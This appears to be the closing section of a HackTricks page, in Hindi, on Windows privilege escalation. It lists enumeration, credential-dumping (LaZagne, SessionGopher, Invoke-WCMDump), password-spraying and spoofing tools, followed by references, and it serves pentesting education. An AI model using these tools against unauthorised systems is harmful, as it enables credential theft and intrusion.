[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations और sensitive files के लिए जांच करें (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित misconfigurations के लिए जाँच और जानकारी एकत्र करें (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations के लिए जाँच**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP saved session जानकारी निकालता है। लोकल में -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से क्रेडेंशियल्स निकालता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- एकत्र किए गए पासवर्ड्स को domain पर spray करें**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS spoofer और man-in-the-middle टूल है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- बेसिक privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- ज्ञात privesc vulnerabilities खोजें (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- लोकल चेक्स **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities खोजें (VisualStudio का उपयोग करके compile करना आवश्यक) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations खोजने के लिए host का enumeration करता है (privesc से अधिक जानकारी एकत्र करने वाला टूल) (compile करना आवश्यक) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई सॉफ़्टवेयर से credentials निकालता है (github में precompiled exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration की जाँच (executable github में precompiled). अनुशंसित नहीं। यह Win10 पर अच्छी तरह काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations की जाँच (python से exe). अनुशंसित नहीं। यह Win10 पर अच्छी तरह काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस पोस्ट के आधार पर बनाया गया टूल (इसे ठीक से काम करने के लिए accesschk की आवश्यकता नहीं है लेकिन यह उसका उपयोग कर सकता है).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** के आउटपुट को पढ़ता है और काम करने वाले exploits सुझाता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** के आउटपुट को पढ़ता है और काम करने वाले exploits सुझाता है (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

आपको प्रोजेक्ट को सही .NET वर्शन का उपयोग करके compile करना होगा ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). पीड़ित होस्ट पर इंस्टॉल किया गया .NET वर्शन देखने के लिए आप कर सकते हैं:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
